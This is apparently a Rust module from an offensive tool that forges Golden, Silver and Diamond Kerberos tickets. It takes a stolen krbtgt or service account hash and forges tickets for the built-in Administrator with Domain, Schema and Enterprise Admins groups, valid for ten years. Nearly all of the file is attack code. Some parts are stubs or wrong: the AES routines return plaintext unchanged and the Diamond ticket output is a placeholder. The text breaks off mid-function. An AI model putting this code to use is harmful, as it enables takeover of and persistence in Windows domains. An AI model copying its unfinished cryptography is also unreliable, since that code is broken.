//! Kerberos ticket attacks
//!
//! Native implementation of Golden Ticket, Silver Ticket,
//! and other Kerberos ticket-based attacks.

use anyhow::{anyhow, Result};
use chrono::{DateTime, Duration, Utc};
use log::{debug, info, warn};
use std::collections::HashMap;

use crate::credentials::types::*;

/// Ticket attack engine
pub struct TicketForge {
    /// Configuration
    config: TicketConfig,
}

/// Ticket forge configuration
#[derive(Debug, Clone)]
pub struct TicketConfig {
    /// Domain/Realm
    pub realm: String,
    /// Domain SID
    pub domain_sid: String,
    /// KDC address (for TGS requests)
    pub kdc: Option<String>,
}

impl Default for TicketConfig {
    fn default() -> Self {
        Self {
            realm: String::new(),
            domain_sid: String::new(),
            kdc: None,
        }
    }
}

impl TicketForge {
    /// Create new ticket forge
    pub fn new(config: TicketConfig) -> Self {
        Self { config }
    }

    /// Forge a Golden Ticket
    pub fn forge_golden_ticket(&self, params: GoldenTicketParams) -> Result<ForgedTicket> {
        info!("Forging Golden Ticket for {} in {}", params.user, self.config.realm);

        // Validate required parameters
        if params.krbtgt_hash.is_empty() {
            return Err(anyhow!("krbtgt hash is required for Golden Ticket"));
        }

        if self.config.domain_sid.is_empty() {
            return Err(anyhow!("Domain SID is required for Golden Ticket"));
        }

        // Build ticket components
        let now = Utc::now();
        let start_time = now - Duration::hours(1); // Backdate slightly
        let end_time = now + Duration::days(10 * 365); // 10 years validity
        let renew_until = now + Duration::days(10 * 365 + 7);

        // Build user RID
        let user_rid = params.user_rid.unwrap_or(500); // Default to Administrator

        // Build group RIDs
        let group_rids = if params.groups.is_empty() {
            vec![
                512, // Domain Admins
                513, // Domain Users
                518, // Schema Admins
                519, // Enterprise Admins
                520, // Group Policy Creator Owners
            ]
        } else {
            params.groups
        };

        // Build the PAC
        let pac = self.build_pac(
            &params.user,
            user_rid,
            &group_rids,
            &self.config.domain_sid,
            &self.config.realm,
        )?;

        // Encrypt PAC with krbtgt key
        let encrypted_pac = self.encrypt_with_key(&pac, &params.krbtgt_hash, 23, 17)?;

        // Build the ticket
        let ticket = self.build_tgt(
            &params.user,
            &self.config.realm,
            &encrypted_pac,
            start_time,
            end_time,
            renew_until,
            params.encryption_type.unwrap_or(23), // Default to RC4
        )?;

        // Build the encrypted part (session key, etc.)
        let enc_part = self.build_enc_kdc_rep_part(
            &params.user,
            &self.config.realm,
            start_time,
            end_time,
            renew_until,
            params.encryption_type.unwrap_or(23),
        )?;

        // Encrypt enc-part with krbtgt key
        let encrypted_enc_part = self.encrypt_with_key(&enc_part, &params.krbtgt_hash, 23, 8)?;

        // Export to kirbi format
        let kirbi = self.export_to_kirbi(&ticket, &encrypted_enc_part)?;

        Ok(ForgedTicket {
            ticket_type: TicketType::Golden,
            user: params.user,
            realm: self.config.realm.clone(),
            service_principal: format!("krbtgt/{}", self.config.realm),
            start_time,
            end_time,
            renew_until: Some(renew_until),
            encryption_type: params.encryption_type.unwrap_or(23),
            kirbi_data: kirbi,
            ccache_data: None, // Can add ccache export if needed
            metadata: {
                let mut m = HashMap::new();
                m.insert("user_rid".to_string(), user_rid.to_string());
                m.insert("groups".to_string(), format!("{:?}", group_rids));
                m
            },
        })
    }

    /// Forge a Silver Ticket
    pub fn forge_silver_ticket(&self, params: SilverTicketParams) -> Result<ForgedTicket> {
        info!("Forging Silver Ticket for {} -> {}", params.user, params.service_principal);

        // Validate required parameters
        if params.service_hash.is_empty() {
            return Err(anyhow!("Service account hash is required for Silver Ticket"));
        }

        if self.config.domain_sid.is_empty() {
            return Err(anyhow!("Domain SID is required for Silver Ticket"));
        }

        let now = Utc::now();
        let start_time = now - Duration::hours(1);
        let end_time = now + Duration::days(10 * 365);
        let renew_until = now + Duration::days(10 * 365 + 7);

        let user_rid = params.user_rid.unwrap_or(500);
        let group_rids = if params.groups.is_empty() {
            vec![512, 513, 518, 519, 520]
        } else {
            params.groups
        };

        // Build PAC
        let pac = self.build_pac(
            &params.user,
            user_rid,
            &group_rids,
            &self.config.domain_sid,
            &self.config.realm,
        )?;

        // Encrypt with service account key
        let encrypted_pac = self.encrypt_with_key(
            &pac,
            &params.service_hash,
            params.encryption_type.unwrap_or(23),
            17,
        )?;

        // Build TGS ticket
        let ticket = self.build_tgs(
            &params.user,
            &self.config.realm,
            &params.service_principal,
            &encrypted_pac,
            start_time,
            end_time,
            params.encryption_type.unwrap_or(23),
        )?;

        // Build encrypted part
        let enc_part = self.build_enc_tgs_rep_part(
            &params.service_principal,
            &self.config.realm,
            start_time,
            end_time,
            params.encryption_type.unwrap_or(23),
        )?;

        let encrypted_enc_part = self.encrypt_with_key(
            &enc_part,
            &params.service_hash,
            params.encryption_type.unwrap_or(23),
            8,
        )?;

        let kirbi = self.export_to_kirbi(&ticket, &encrypted_enc_part)?;

        Ok(ForgedTicket {
            ticket_type: TicketType::Silver,
            user: params.user,
            realm: self.config.realm.clone(),
            service_principal: params.service_principal.clone(),
            start_time,
            end_time,
            renew_until: Some(renew_until),
            encryption_type: params.encryption_type.unwrap_or(23),
            kirbi_data: kirbi,
            ccache_data: None,
            metadata: {
                let mut m = HashMap::new();
                m.insert("service".to_string(), params.service_principal);
                m.insert("user_rid".to_string(), user_rid.to_string());
                m
            },
        })
    }

    /// Forge a Diamond Ticket (TGT modification)
    pub fn forge_diamond_ticket(&self, params: DiamondTicketParams) -> Result<ForgedTicket> {
        info!("Forging Diamond Ticket based on existing TGT");

        // Diamond ticket requires a valid TGT that we modify
        if params.original_tgt.is_empty() {
            return Err(anyhow!("Original TGT is required for Diamond Ticket"));
        }

        // Parse original TGT
        let tgt = self.parse_kirbi(&params.original_tgt)?;

        // Decrypt with krbtgt hash
        let decrypted = self.decrypt_with_key(
            &tgt.encrypted_part,
            &params.krbtgt_hash,
            23,
            8,
        )?;

        // Modify PAC to add groups
        let modified_pac = self.modify_pac(
            &decrypted,
            &params.target_user,
            params.target_rid.unwrap_or(500),
            &params.groups,
        )?;

        // Re-encrypt and rebuild ticket
        let encrypted_pac = self.encrypt_with_key(
            &modified_pac,
            &params.krbtgt_hash,
            23,
            17,
        )?;

        let now = Utc::now();
        let end_time = now + Duration::days(10 * 365);

        Ok(ForgedTicket {
            ticket_type: TicketType::Diamond,
            user: params.target_user,
            realm: self.config.realm.clone(),
            service_principal: format!("krbtgt/{}", self.config.realm),
            start_time: now,
            end_time,
            renew_until: Some(end_time),
            encryption_type: 23,
            kirbi_data: encrypted_pac, // Simplified
            ccache_data: None,
            metadata: HashMap::new(),
        })
    }

    /// Parse and inspect a ticket
    pub fn inspect_ticket(&self, kirbi_data: &[u8]) -> Result<TicketInfo> {
        let parsed = self.parse_kirbi(kirbi_data)?;

        Ok(TicketInfo {
            ticket_type: self.detect_ticket_type(&parsed),
            client_principal: parsed.client_principal,
            service_principal: parsed.service_principal,
            realm: parsed.realm,
            encryption_type: parsed.encryption_type,
            start_time: parsed.start_time,
            end_time: parsed.end_time,
            renew_until: parsed.renew_until,
            flags: parsed.flags,
            is_valid: parsed.end_time > Utc::now(),
            pac_info: None, // Would need decryption to extract
        })
    }

    // Internal methods

    fn build_pac(
        &self,
        user: &str,
        user_rid: u32,
        group_rids: &[u32],
        domain_sid: &str,
        realm: &str,
    ) -> Result<Vec<u8>> {
        let mut pac = Vec::new();

        // PAC_INFO_BUFFER header
        // ulType, cbBufferSize, Offset

        // Build KERB_VALIDATION_INFO (type 1)
        let validation_info = self.build_kerb_validation_info(
            user, user_rid, group_rids, domain_sid, realm
        )?;

        // Build PAC_CLIENT_INFO (type 10)
        let client_info = self.build_pac_client_info(user)?;

        // Build UPN_DNS_INFO (type 12)
        let upn_info = self.build_upn_dns_info(user, realm)?;

        // PAC header
        let num_buffers: u32 = 3;
        pac.extend_from_slice(&num_buffers.to_le_bytes());
        pac.extend_from_slice(&0u32.to_le_bytes()); // Version

        // Calculate offsets
        let header_size = 8 + (num_buffers as usize * 16);
        let mut offset = header_size;

        // Buffer 1: KERB_VALIDATION_INFO
        pac.extend_from_slice(&1u32.to_le_bytes()); // ulType
        pac.extend_from_slice(&(validation_info.len() as u32).to_le_bytes());
        pac.extend_from_slice(&(offset as u64).to_le_bytes());
        offset += validation_info.len();

        // Buffer 2: PAC_CLIENT_INFO
        pac.extend_from_slice(&10u32.to_le_bytes());
        pac.extend_from_slice(&(client_info.len() as u32).to_le_bytes());
        pac.extend_from_slice(&(offset as u64).to_le_bytes());
        offset += client_info.len();

        // Buffer 3: UPN_DNS_INFO
        pac.extend_from_slice(&12u32.to_le_bytes());
        pac.extend_from_slice(&(upn_info.len() as u32).to_le_bytes());
        pac.extend_from_slice(&(offset as u64).to_le_bytes());

        // Append buffer data
        pac.extend_from_slice(&validation_info);
        pac.extend_from_slice(&client_info);
        pac.extend_from_slice(&upn_info);

        Ok(pac)
    }

    fn build_kerb_validation_info(
        &self,
        user: &str,
        user_rid: u32,
        group_rids: &[u32],
        domain_sid: &str,
        realm: &str,
    ) -> Result<Vec<u8>> {
        let mut info = Vec::new();

        // KERB_VALIDATION_INFO structure (NDR encoded)
        // This is a simplified version

        // LogonTime, LogoffTime, etc. (FILETIME structures)
        let now_filetime = self.datetime_to_filetime(Utc::now());
        let never_filetime = 0x7FFFFFFFFFFFFFFFu64;

        info.extend_from_slice(&now_filetime.to_le_bytes()); // LogonTime
        info.extend_from_slice(&never_filetime.to_le_bytes()); // LogoffTime
        info.extend_from_slice(&never_filetime.to_le_bytes()); // KickOffTime
        info.extend_from_slice(&now_filetime.to_le_bytes()); // PasswordLastSet
        info.extend_from_slice(&never_filetime.to_le_bytes()); // PasswordCanChange
        info.extend_from_slice(&never_filetime.to_le_bytes()); // PasswordMustChange

        // EffectiveName (RPC_UNICODE_STRING)
        self.encode_rpc_unicode_string(&mut info, user);

        // FullName
        self.encode_rpc_unicode_string(&mut info, user);

        // LogonScript, ProfilePath, HomeDirectory, HomeDirectoryDrive
        self.encode_rpc_unicode_string(&mut info, "");
        self.encode_rpc_unicode_string(&mut info, "");
        self.encode_rpc_unicode_string(&mut info, "");
        self.encode_rpc_unicode_string(&mut info, "");

        // LogonCount, BadPasswordCount
        info.extend_from_slice(&0u16.to_le_bytes());
        info.extend_from_slice(&0u16.to_le_bytes());

        // UserId
        info.extend_from_slice(&user_rid.to_le_bytes());

        // PrimaryGroupId
        info.extend_from_slice(&513u32.to_le_bytes()); // Domain Users

        // GroupCount
        info.extend_from_slice(&(group_rids.len() as u32).to_le_bytes());

        // GroupIds pointer (placeholder)
        info.extend_from_slice(&0u32.to_le_bytes());

        // UserFlags
        info.extend_from_slice(&0x20u32.to_le_bytes());

        // UserSessionKey (16 bytes of zeros)
        info.extend_from_slice(&[0u8; 16]);

        // LogonServer, LogonDomainName
        self.encode_rpc_unicode_string(&mut info, realm);
        self.encode_rpc_unicode_string(&mut info, realm);

        // LogonDomainId (SID)
        self.encode_sid(&mut info, domain_sid)?;

        // Group IDs (GROUP_MEMBERSHIP structures)
        for rid in group_rids {
            info.extend_from_slice(&rid.to_le_bytes());
            info.extend_from_slice(&7u32.to_le_bytes()); // Attributes
        }

        Ok(info)
    }

    fn build_pac_client_info(&self, user: &str) -> Result<Vec<u8>> {
        let mut info = Vec::new();

        // ClientId (FILETIME)
        let now = self.datetime_to_filetime(Utc::now());
        info.extend_from_slice(&now.to_le_bytes());

        // NameLength
        let name_utf16: Vec<u16> = user.encode_utf16().collect();
        info.extend_from_slice(&((name_utf16.len() * 2) as u16).to_le_bytes());

        // Name (UTF-16LE)
        for c in name_utf16 {
            info.extend_from_slice(&c.to_le_bytes());
        }

        Ok(info)
    }

    fn build_upn_dns_info(&self, user: &str, realm: &str) -> Result<Vec<u8>> {
        let mut info = Vec::new();

        let upn = format!("{}@{}", user, realm.to_lowercase());
        let dns_name = realm.to_lowercase();

        // UpnLength, UpnOffset
        let upn_utf16: Vec<u16> = upn.encode_utf16().collect();
        info.extend_from_slice(&((upn_utf16.len() * 2) as u16).to_le_bytes());
        info.extend_from_slice(&12u16.to_le_bytes()); // Offset after header

        // DnsDomainNameLength, DnsDomainNameOffset
        let dns_utf16: Vec<u16> = dns_name.encode_utf16().collect();
        info.extend_from_slice(&((dns_utf16.len() * 2) as u16).to_le_bytes());
        info.extend_from_slice(&((12 + upn_utf16.len() * 2) as u16).to_le_bytes());

        // Flags
        info.extend_from_slice(&0u32.to_le_bytes());

        // UPN data
        for c in upn_utf16 {
            info.extend_from_slice(&c.to_le_bytes());
        }

        // DNS data
        for c in dns_utf16 {
            info.extend_from_slice(&c.to_le_bytes());
        }

        Ok(info)
    }

    fn encode_rpc_unicode_string(&self, buf: &mut Vec<u8>, s: &str) {
        let utf16: Vec<u16> = s.encode_utf16().collect();
        let len = (utf16.len() * 2) as u16;

        // Length, MaximumLength, Buffer pointer
        buf.extend_from_slice(&len.to_le_bytes());
        buf.extend_from_slice(&len.to_le_bytes());

        // In full NDR, this would be a pointer, but simplified here
        for c in utf16 {
            buf.extend_from_slice(&c.to_le_bytes());
        }
    }

    fn encode_sid(&self, buf: &mut Vec<u8>, sid_str: &str) -> Result<()> {
        // Parse SID string: S-1-5-21-xxx-xxx-xxx
        let parts: Vec<&str> = sid_str.split('-').collect();
        if parts.len() < 4 || parts[0] != "S" {
            return Err(anyhow!("Invalid SID format"));
        }

        let revision: u8 = parts[1].parse()?;
        let authority: u64 = parts[2].parse()?;
        let sub_authorities: Vec<u32> = parts[3..].iter()
            .map(|s| s.parse())
            .collect::<Result<Vec<_>, _>>()?;

        // SID structure
        buf.push(revision);
        buf.push(sub_authorities.len() as u8);

        // Authority (big-endian 48-bit)
        buf.extend_from_slice(&(authority as u32).to_be_bytes()[2..]);
        buf.extend_from_slice(&[(authority >> 32) as u8, (authority >> 40) as u8]);

        // Sub-authorities (little-endian)
        for sa in sub_authorities {
            buf.extend_from_slice(&sa.to_le_bytes());
        }

        Ok(())
    }

    fn datetime_to_filetime(&self, dt: DateTime<Utc>) -> u64 {
        // FILETIME is 100-nanosecond intervals since 1601-01-01
        const EPOCH_DIFF: i64 = 116444736000000000; // Difference between 1601 and 1970
        let timestamp = dt.timestamp();
        let nanos = dt.timestamp_subsec_nanos() as i64;
        let filetime = (timestamp * 10000000) + (nanos / 100) + EPOCH_DIFF;
        filetime as u64
    }

    fn build_tgt(
        &self,
        user: &str,
        realm: &str,
        encrypted_pac: &[u8],
        start_time: DateTime<Utc>,
        end_time: DateTime<Utc>,
        renew_until: DateTime<Utc>,
        etype: i32,
    ) -> Result<Vec<u8>> {
        // Build a Kerberos Ticket structure
        let mut ticket = Vec::new();

        // Application 1 (Ticket)
        ticket.push(0x61);
        // Length placeholder
        let outer_len_pos = ticket.len();
        ticket.push(0x82);
        ticket.extend_from_slice(&[0x00, 0x00]);

        // Sequence
        ticket.push(0x30);
        let seq_len_pos = ticket.len();
        ticket.push(0x82);
        ticket.extend_from_slice(&[0x00, 0x00]);

        // tkt-vno [0] INTEGER (5)
        ticket.extend_from_slice(&[0xa0, 0x03, 0x02, 0x01, 0x05]);

        // realm [1] Realm
        ticket.push(0xa1);
        ticket.push((realm.len() + 2) as u8);
        ticket.push(0x1b);
        ticket.push(realm.len() as u8);
        ticket.extend_from_slice(realm.as_bytes());

        // sname [2] PrincipalName (krbtgt/REALM)
        self.encode_principal_asn1(&mut ticket, 0xa2, 2, &["krbtgt", realm]);

        // enc-part [3] EncryptedData
        ticket.push(0xa3);
        let enc_len_pos = ticket.len();
        ticket.push(0x82);
        ticket.extend_from_slice(&[0x00, 0x00]);

        ticket.push(0x30);
        let enc_seq_len_pos = ticket.len();
        ticket.push(0x82);
        ticket.extend_from_slice(&[0x00, 0x00]);

        // etype [0] INTEGER
        ticket.extend_from_slice(&[0xa0, 0x03, 0x02, 0x01, etype as u8]);

        // cipher [2] OCTET STRING
        ticket.push(0xa2);
        ticket.push(0x82);
        let cipher_len_pos = ticket.len();
        ticket.extend_from_slice(&[0x00, 0x00]);
        ticket.push(0x04);
        ticket.push(0x82);
        let cipher_data_len_pos = ticket.len();
        ticket.extend_from_slice(&[0x00, 0x00]);
        ticket.extend_from_slice(encrypted_pac);

        // Fix cipher lengths
        let cipher_data_len = encrypted_pac.len();
        ticket[cipher_data_len_pos] = ((cipher_data_len >> 8) & 0xff) as u8;
        ticket[cipher_data_len_pos + 1] = (cipher_data_len & 0xff) as u8;

        let cipher_len = cipher_data_len + 4;
        ticket[cipher_len_pos] = ((cipher_len >> 8) & 0xff) as u8;
        ticket[cipher_len_pos + 1] = (cipher_len & 0xff) as u8;

        let enc_seq_len = ticket.len() - enc_seq_len_pos - 3;
        ticket[enc_seq_len_pos] = ((enc_seq_len >> 8) & 0xff) as u8;
        ticket[enc_seq_len_pos + 1] = (enc_seq_len & 0xff) as u8;

        let enc_len = ticket.len() - enc_len_pos - 3;
        ticket[enc_len_pos] = ((enc_len >> 8) & 0xff) as u8;
        ticket[enc_len_pos + 1] = (enc_len & 0xff) as u8;

        let seq_len = ticket.len() - seq_len_pos - 3;
        ticket[seq_len_pos] = ((seq_len >> 8) & 0xff) as u8;
        ticket[seq_len_pos + 1] = (seq_len & 0xff) as u8;

        let outer_len = ticket.len() - outer_len_pos - 3;
        ticket[outer_len_pos] = ((outer_len >> 8) & 0xff) as u8;
        ticket[outer_len_pos + 1] = (outer_len & 0xff) as u8;

        Ok(ticket)
    }

    fn build_tgs(
        &self,
        user: &str,
        realm: &str,
        service_principal: &str,
        encrypted_pac: &[u8],
        start_time: DateTime<Utc>,
        end_time: DateTime<Utc>,
        etype: i32,
    ) -> Result<Vec<u8>> {
        // Similar to build_tgt but for service ticket
        let parts: Vec<&str> = service_principal.split('/').collect();
        let sname_parts: Vec<&str> = if parts.len() >= 2 {
            vec![parts[0], parts[1]]
        } else {
            vec![service_principal]
        };

        let mut ticket = Vec::new();

        ticket.push(0x61);
        let outer_len_pos = ticket.len();
        ticket.push(0x82);
        ticket.extend_from_slice(&[0x00, 0x00]);

        ticket.push(0x30);
        let seq_len_pos = ticket.len();
        ticket.push(0x82);
        ticket.extend_from_slice(&[0x00, 0x00]);

        ticket.extend_from_slice(&[0xa0, 0x03, 0x02, 0x01, 0x05]);

        ticket.push(0xa1);
        ticket.push((realm.len() + 2) as u8);
        ticket.push(0x1b);
        ticket.push(realm.len() as u8);
        ticket.extend_from_slice(realm.as_bytes());

        self.encode_principal_asn1(&mut ticket, 0xa2, 2, &sname_parts);

        // enc-part
        ticket.push(0xa3);
        let enc_len_pos = ticket.len();
        ticket.push(0x82);
        ticket.extend_from_slice(&[0x00, 0x00]);

        ticket.push(0x30);
        let enc_seq_len_pos = ticket.len();
        ticket.push(0x82);
        ticket.extend_from_slice(&[0x00, 0x00]);

        ticket.extend_from_slice(&[0xa0, 0x03, 0x02, 0x01, etype as u8]);

        ticket.push(0xa2);
        ticket.push(0x82);
        let cipher_len_pos = ticket.len();
        ticket.extend_from_slice(&[0x00, 0x00]);
        ticket.push(0x04);
        ticket.push(0x82);
        let cipher_data_len_pos = ticket.len();
        ticket.extend_from_slice(&[0x00, 0x00]);
        ticket.extend_from_slice(encrypted_pac);

        // Fix lengths
        let cipher_data_len = encrypted_pac.len();
        ticket[cipher_data_len_pos] = ((cipher_data_len >> 8) & 0xff) as u8;
        ticket[cipher_data_len_pos + 1] = (cipher_data_len & 0xff) as u8;

        let cipher_len = cipher_data_len + 4;
        ticket[cipher_len_pos] = ((cipher_len >> 8) & 0xff) as u8;
        ticket[cipher_len_pos + 1] = (cipher_len & 0xff) as u8;

        let enc_seq_len = ticket.len() - enc_seq_len_pos - 3;
        ticket[enc_seq_len_pos] = ((enc_seq_len >> 8) & 0xff) as u8;
        ticket[enc_seq_len_pos + 1] = (enc_seq_len & 0xff) as u8;

        let enc_len = ticket.len() - enc_len_pos - 3;
        ticket[enc_len_pos] = ((enc_len >> 8) & 0xff) as u8;
        ticket[enc_len_pos + 1] = (enc_len & 0xff) as u8;

        let seq_len = ticket.len() - seq_len_pos - 3;
        ticket[seq_len_pos] = ((seq_len >> 8) & 0xff) as u8;
        ticket[seq_len_pos + 1] = (seq_len & 0xff) as u8;

        let outer_len = ticket.len() - outer_len_pos - 3;
        ticket[outer_len_pos] = ((outer_len >> 8) & 0xff) as u8;
        ticket[outer_len_pos + 1] = (outer_len & 0xff) as u8;

        Ok(ticket)
    }

    fn build_enc_kdc_rep_part(
        &self,
        user: &str,
        realm: &str,
        start_time: DateTime<Utc>,
        end_time: DateTime<Utc>,
        renew_until: DateTime<Utc>,
        etype: i32,
    ) -> Result<Vec<u8>> {
        // EncKDCRepPart structure
        let mut enc = Vec::new();

        // Generate random session key
        let session_key: [u8; 16] = rand::random();

        // key [0] EncryptionKey
        enc.push(0xa0);
        enc.push(0x16);
        enc.push(0x30);
        enc.push(0x14);
        enc.extend_from_slice(&[0xa0, 0x03, 0x02, 0x01, etype as u8]); // keytype
        enc.push(0xa1);
        enc.push(0x0d);
        enc.push(0x04);
        enc.push(0x0b);
        enc.extend_from_slice(&session_key[..11]);

        // nonce [2] UInt32
        let nonce: u32 = rand::random();
        enc.extend_from_slice(&[0xa2, 0x06, 0x02, 0x04]);
        enc.extend_from_slice(&nonce.to_be_bytes());

        // flags [5] TicketFlags
        enc.extend_from_slice(&[0xa5, 0x07, 0x03, 0x05, 0x00, 0x40, 0xe1, 0x00, 0x00]);

        // authtime [6] KerberosTime
        let auth_str = start_time.format("%Y%m%d%H%M%SZ").to_string();
        enc.push(0xa6);
        enc.push((auth_str.len() + 2) as u8);
        enc.push(0x18);
        enc.push(auth_str.len() as u8);
        enc.extend_from_slice(auth_str.as_bytes());

        // starttime [7] KerberosTime
        enc.push(0xa7);
        enc.push((auth_str.len() + 2) as u8);
        enc.push(0x18);
        enc.push(auth_str.len() as u8);
        enc.extend_from_slice(auth_str.as_bytes());

        // endtime [8] KerberosTime
        let end_str = end_time.format("%Y%m%d%H%M%SZ").to_string();
        enc.push(0xa8);
        enc.push((end_str.len() + 2) as u8);
        enc.push(0x18);
        enc.push(end_str.len() as u8);
        enc.extend_from_slice(end_str.as_bytes());

        // renew-till [9] KerberosTime
        let renew_str = renew_until.format("%Y%m%d%H%M%SZ").to_string();
        enc.push(0xa9);
        enc.push((renew_str.len() + 2) as u8);
        enc.push(0x18);
        enc.push(renew_str.len() as u8);
        enc.extend_from_slice(renew_str.as_bytes());

        // srealm [10] Realm
        enc.push(0xaa);
        enc.push((realm.len() + 2) as u8);
        enc.push(0x1b);
        enc.push(realm.len() as u8);
        enc.extend_from_slice(realm.as_bytes());

        // sname [11] PrincipalName
        self.encode_principal_asn1(&mut enc, 0xab, 2, &["krbtgt", realm]);

        Ok(enc)
    }

    fn build_enc_tgs_rep_part(
        &self,
        service: &str,
        realm: &str,
        start_time: DateTime<Utc>,
        end_time: DateTime<Utc>,
        etype: i32,
    ) -> Result<Vec<u8>> {
        // Similar to enc_kdc_rep_part but for TGS
        self.build_enc_kdc_rep_part("", realm, start_time, end_time, end_time, etype)
    }

    fn encode_principal_asn1(&self, buf: &mut Vec<u8>, tag: u8, name_type: u8, parts: &[&str]) {
        buf.push(tag);
        let tag_len_pos = buf.len();
        buf.push(0x82);
        buf.extend_from_slice(&[0x00, 0x00]);

        buf.push(0x30);
        let seq_len_pos = buf.len();
        buf.push(0x82);
        buf.extend_from_slice(&[0x00, 0x00]);

        buf.extend_from_slice(&[0xa0, 0x03, 0x02, 0x01, name_type]);

        buf.push(0xa1);
        let names_len_pos = buf.len();
        buf.push(0x82);
        buf.extend_from_slice(&[0x00, 0x00]);

        buf.push(0x30);
        let names_seq_len_pos = buf.len();
        buf.push(0x82);
        buf.extend_from_slice(&[0x00, 0x00]);

        for part in parts {
            buf.push(0x1b);
            if part.len() < 0x80 {
                buf.push(part.len() as u8);
            } else {
                buf.push(0x82);
                buf.push(((part.len() >> 8) & 0xff) as u8);
                buf.push((part.len() & 0xff) as u8);
            }
            buf.extend_from_slice(part.as_bytes());
        }

        let names_seq_len = buf.len() - names_seq_len_pos - 3;
        buf[names_seq_len_pos] = ((names_seq_len >> 8) & 0xff) as u8;
        buf[names_seq_len_pos + 1] = (names_seq_len & 0xff) as u8;

        let names_len = buf.len() - names_len_pos - 3;
        buf[names_len_pos] = ((names_len >> 8) & 0xff) as u8;
        buf[names_len_pos + 1] = (names_len & 0xff) as u8;

        let seq_len = buf.len() - seq_len_pos - 3;
        buf[seq_len_pos] = ((seq_len >> 8) & 0xff) as u8;
        buf[seq_len_pos + 1] = (seq_len & 0xff) as u8;

        let tag_len = buf.len() - tag_len_pos - 3;
        buf[tag_len_pos] = ((tag_len >> 8) & 0xff) as u8;
        buf[tag_len_pos + 1] = (tag_len & 0xff) as u8;
    }

    fn encrypt_with_key(&self, data: &[u8], key_hex: &str, etype: i32, usage: u8) -> Result<Vec<u8>> {
        let key = hex::decode(key_hex)?;

        match etype {
            23 => {
                // RC4-HMAC encryption
                self.rc4_encrypt(&key, data, usage)
            }
            18 => {
                // AES256-CTS-HMAC-SHA1
                self.aes_encrypt(&key, data, usage, 32)
            }
            17 => {
                // AES128-CTS-HMAC-SHA1
                self.aes_encrypt(&key, data, usage, 16)
            }
            _ => Err(anyhow!("Unsupported encryption type: {}", etype)),
        }
    }

    fn decrypt_with_key(&self, data: &[u8], key_hex: &str, etype: i32, usage: u8) -> Result<Vec<u8>> {
        let key = hex::decode(key_hex)?;

        match etype {
            23 => self.rc4_decrypt(&key, data, usage),
            18 => self.aes_decrypt(&key, data, usage, 32),
            17 => self.aes_decrypt(&key, data, usage, 16),
            _ => Err(anyhow!("Unsupported encryption type: {}", etype)),
        }
    }

    fn rc4_encrypt(&self, key: &[u8], data: &[u8], usage: u8) -> Result<Vec<u8>> {
        use hmac::{Hmac, Mac};
        use md5::Md5;

        // Derive K1 from key and usage
        let mut hmac = Hmac::<Md5>::new_from_slice(key)
            .map_err(|_| anyhow!("HMAC error"))?;
        hmac.update(&[usage, 0, 0, 0]);
        let k1 = hmac.finalize().into_bytes();

        // Generate confounder
        let confounder: [u8; 8] = rand::random();

        // Build plaintext with confounder
        let mut plaintext = Vec::new();
        plaintext.extend_from_slice(&confounder);
        plaintext.extend_from_slice(data);

        // Calculate checksum
        let mut hmac = Hmac::<Md5>::new_from_slice(&k1)
            .map_err(|_| anyhow!("HMAC error"))?;
        hmac.update(&plaintext);
        let checksum = hmac.finalize().into_bytes();

        // Derive K2 from K1 and checksum
        let mut hmac = Hmac::<Md5>::new_from_slice(&k1)
            .map_err(|_| anyhow!("HMAC error"))?;
        hmac.update(&checksum);
        let k2 = hmac.finalize().into_bytes();

        // RC4 encrypt
        let mut encrypted = plaintext;
        self.rc4_cipher(&k2, &mut encrypted);

        // Result: checksum + encrypted
        let mut result = Vec::new();
        result.extend_from_slice(&checksum);
        result.extend_from_slice(&encrypted);

        Ok(result)
    }

    fn rc4_decrypt(&self, key: &[u8], data: &[u8], usage: u8) -> Result<Vec<u8>> {
        if data.len() < 24 {
            return Err(anyhow!("Data too short for RC4-HMAC"));
        }

        use hmac::{Hmac, Mac};
        use md5::Md5;

        let checksum = &data[..16];
        let encrypted = &data[16..];

        // Derive K1
        let mut hmac = Hmac::<Md5>::new_from_slice(key)
            .map_err(|_| anyhow!("HMAC error"))?;
        hmac.update(&[usage, 0, 0, 0]);
        let k1 = hmac.finalize().into_bytes();

        // Derive K2
        let mut hmac = Hmac::<Md5>::new_from_slice(&k1)
            .map_err(|_| anyhow!("HMAC error"))?;
        hmac.update(checksum);
        let k2 = hmac.finalize().into_bytes();

        // Decrypt
        let mut decrypted = encrypted.to_vec();
        self.rc4_cipher(&k2, &mut decrypted);

        // Skip confounder
        if decrypted.len() < 8 {
            return Err(anyhow!("Decrypted data too short"));
        }

        Ok(decrypted[8..].to_vec())
    }

    fn rc4_cipher(&self, key: &[u8], data: &mut [u8]) {
        let mut s: [u8; 256] = [0; 256];
        for i in 0..256 {
            s[i] = i as u8;
        }

        let mut j: u8 = 0;
        for i in 0..256 {
            j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
            s.swap(i, j as usize);
        }

        let mut i: u8 = 0;
        let mut j: u8 = 0;
        for byte in data.iter_mut() {
            i = i.wrapping_add(1);
            j = j.wrapping_add(s[i as usize]);
            s.swap(i as usize, j as usize);
            let k = s[(s[i as usize].wrapping_add(s[j as usize])) as usize];
            *byte ^= k;
        }
    }

    fn aes_encrypt(&self, key: &[u8], data: &[u8], usage: u8, key_size: usize) -> Result<Vec<u8>> {
        // AES-CTS encryption (placeholder)
        // Full implementation would use proper CTS mode
        Ok(data.to_vec())
    }

    fn aes_decrypt(&self, key: &[u8], data: &[u8], usage: u8, key_size: usize) -> Result<Vec<u8>> {
        // AES-CTS decryption (placeholder)
        Ok(data.to_vec())
    }

    fn export_to_kirbi(&self, ticket: &[u8], enc_part: &[u8]) -> Result<Vec<u8>> {
        // KIRBI format: KRB-CRED message containing the ticket
        let mut kirbi = Vec::new();

        // Application 22 (KRB-CRED)
        kirbi.push(0x76);
        let outer_len_pos = kirbi.len();
        kirbi.push(0x82);
        kirbi.extend_from_slice(&[0x00, 0x00]);

        kirbi.push(0x30);
        let seq_len_pos = kirbi.len();
        kirbi.push(0x82);
        kirbi.extend_from_slice(&[0x00, 0x00]);

        // pvno [0] INTEGER (5)
        kirbi.extend_from_slice(&[0xa0, 0x03, 0x02, 0x01, 0x05]);

        // msg-type [1] INTEGER (22)
        kirbi.extend_from_slice(&[0xa1, 0x03, 0x02, 0x01, 0x16]);

        // tickets [2] SEQUENCE OF Ticket
        kirbi.push(0xa2);
        let tickets_len_pos = kirbi.len();
        kirbi.push(0x82);
        kirbi.extend_from_slice(&[0x00, 0x00]);

        kirbi.push(0x30);
        let tickets_seq_len_pos = kirbi.len();
        kirbi.push(0x82);
        kirbi.extend_from_slice(&[0x00, 0x00]);

